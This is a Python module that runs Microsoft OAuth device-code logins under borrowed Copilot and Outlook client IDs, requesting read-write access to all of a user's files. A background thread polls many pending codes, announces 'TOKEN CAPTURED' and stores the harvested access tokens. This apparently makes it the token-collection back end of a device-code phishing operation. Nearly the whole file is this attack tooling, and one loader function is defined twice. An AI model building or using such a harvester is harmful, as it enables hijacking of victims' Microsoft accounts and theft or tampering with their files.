import json
import time
import threading
from pathlib import Path
from datetime import datetime

import requests


DEVICE_CODE_URL = (
    "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
)

TOKEN_URL = (
    "https://login.microsoftonline.com/common/oauth2/v2.0/token"
)

CLIENT_IDS = {

    "copilot":
        "0ec893e0-5785-4de6-99da-4ed124e5296c",

    "outlook":
        "5d661950-3475-41cd-a2c3-d671a3162bc1"
}

HEADERS = {
    "Content-Type":
        "application/x-www-form-urlencoded"
}

SCOPE = "Files.ReadWrite.All"

ACTIVE_DEVICE_CODES = []

TOKEN_DIR = Path(
    "data/tokens"
)

TOKEN_DIR.mkdir(
    parents=True,
    exist_ok=True
)


# ------------------------------------------------
# SAVE TOKEN
# ------------------------------------------------

def save_token(
    token_data,
    app
):

    timestamp = datetime.utcnow().strftime(
        "%Y%m%d_%H%M%S"
    )

    path = TOKEN_DIR / (
        f"{app}_{timestamp}.json"
    )

    with open(
        path,
        "w",
        encoding="utf-8"
    ) as f:

        json.dump(
            token_data,
            f,
            indent=4
        )

    print(
        f"[+] Token saved: {path}"
    )

    return path


# ------------------------------------------------
# LOAD LATEST TOKEN
# ------------------------------------------------

def load_latest_token(
    app="copilot"
):

    files = sorted(
        TOKEN_DIR.glob(f"{app}_*.json"),
        reverse=True
    )

    if not files:

        return None

    latest = files[0]

    with open(
        latest,
        "r",
        encoding="utf-8"
    ) as f:

        data = json.load(f)

    return data


# ------------------------------------------------
# REQUEST DEVICE CODE
# ------------------------------------------------

def request_device_code(
    client_id
):

    data = {

        "client_id":
            client_id,

        "scope":
            SCOPE
    }

    r = requests.post(
        DEVICE_CODE_URL,
        headers=HEADERS,
        data=data
    )

    r.raise_for_status()

    resp = r.json()

    flow = {

        "device_code":
            resp["device_code"],

        "user_code":
            resp["user_code"],

        "verification_uri":
            resp["verification_uri"],

        "interval":
            resp.get("interval", 5),

        "expires_in":
            resp["expires_in"],

        "client_id":
            client_id,

        "created":
            time.time()
    }

    ACTIVE_DEVICE_CODES.append(
        flow
    )

    return flow


# ------------------------------------------------
# POLL TOKEN
# ------------------------------------------------

def poll_token(
    device_code,
    client_id
):

    data = {

        "grant_type":
            "urn:ietf:params:oauth:grant-type:device_code",

        "client_id":
            client_id,

        "device_code":
            device_code
    }

    r = requests.post(
        TOKEN_URL,
        headers=HEADERS,
        data=data
    )

    return r.json()


# ------------------------------------------------
# SIMPLE DEVICE FLOW
# ------------------------------------------------

def device_flow(
    app="copilot"
):

    if app not in CLIENT_IDS:

        print(
            f"[-] Unknown app profile: "
            f"{app}"
        )

        return None

    client_id = CLIENT_IDS[app]

    flow = request_device_code(
        client_id
    )

    print("\n=== DEVICE LOGIN ===")

    print(
        f"Login: "
        f"{flow['verification_uri']}"
    )

    print(
        f"Code : "
        f"{flow['user_code']}"
    )

    expires = (
        time.time() +
        flow["expires_in"]
    )

    while time.time() < expires:

        resp = poll_token(
            flow["device_code"],
            client_id
        )

        # -----------------------------
        # SUCCESS
        # -----------------------------

        if "access_token" in resp:

            print(
                "\n[+] Token acquired"
            )

            save_token(
                resp,
                app
            )

            return resp[
                "access_token"
            ]

        # -----------------------------
        # WAITING
        # -----------------------------

        if (
            resp.get("error")
            ==
            "authorization_pending"
        ):

            print(
                ".",
                end="",
                flush=True
            )

        # -----------------------------
        # SLOW DOWN
        # -----------------------------

        elif (
            resp.get("error")
            ==
            "slow_down"
        ):

            print(
                "\n[!] Slow down requested"
            )

            time.sleep(
                flow.get(
                    "interval",
                    5
                ) + 5
            )

        # -----------------------------
        # EXPIRED
        # -----------------------------

        elif (
            resp.get("error")
            ==
            "expired_token"
        ):

            print(
                "\n[-] Device code expired"
            )

            return None

        time.sleep(
            flow.get(
                "interval",
                5
            )
        )

    print(
        "\n[-] Authentication timed out"
    )

    return None


# ------------------------------------------------
# DEVICE MONITOR
# ------------------------------------------------

def monitor_device_codes():

    while True:

        for flow in ACTIVE_DEVICE_CODES[:]:

            expired = (

                time.time()
                -
                flow["created"]

            ) > flow["expires_in"]

            # -------------------------
            # EXPIRED
            # -------------------------

            if expired:

                print(
                    f"[-] Device code expired: "
                    f"{flow['user_code']}"
                )

                ACTIVE_DEVICE_CODES.remove(
                    flow
                )

                continue

            # -------------------------
            # POLL TOKEN
            # -------------------------

            resp = poll_token(
                flow["device_code"],
                flow["client_id"]
            )

            # -------------------------
            # SUCCESS
            # -------------------------

            if "access_token" in resp:

                print(
                    f"\n[+] TOKEN CAPTURED: "
                    f"{flow['user_code']}"
                )

                app_name = next(

                    (
                        k for k, v
                        in CLIENT_IDS.items()

                        if v == flow[
                            "client_id"
                        ]
                    ),

                    "unknown"
                )

                save_token(
                    resp,
                    app_name
                )

                ACTIVE_DEVICE_CODES.remove(
                    flow
                )

        time.sleep(5)

# ------------------------------------------------
# LOAD TOKEN FILE
# ------------------------------------------------

def load_token_file(path):

    try:

        with open(
            path,
            "r",
            encoding="utf-8"
        ) as f:

            data = json.load(f)

        return data

    except Exception as e:

        print(
            f"[-] Failed to load token: {e}"
        )

        return None


# ------------------------------------------------
# LOAD LATEST TOKEN
# ------------------------------------------------

def load_latest_token(
    app="copilot"
):

    files = sorted(
        TOKEN_DIR.glob(f"{app}_*.json"),
        reverse=True
    )

    if not files:

        print(
            "[-] No saved sessions found"
        )

        return None

    latest = files[0]

    print(
        f"[+] Using latest session: "
        f"{latest.name}"
    )

    return load_token_file(
        latest
    )


# ------------------------------------------------
# START MONITOR
# ------------------------------------------------

def start_device_monitor():

    thread = threading.Thread(
        target=monitor_device_codes,
        daemon=True
    )

    thread.start()

    print(
        "[+] Device monitor started"
    )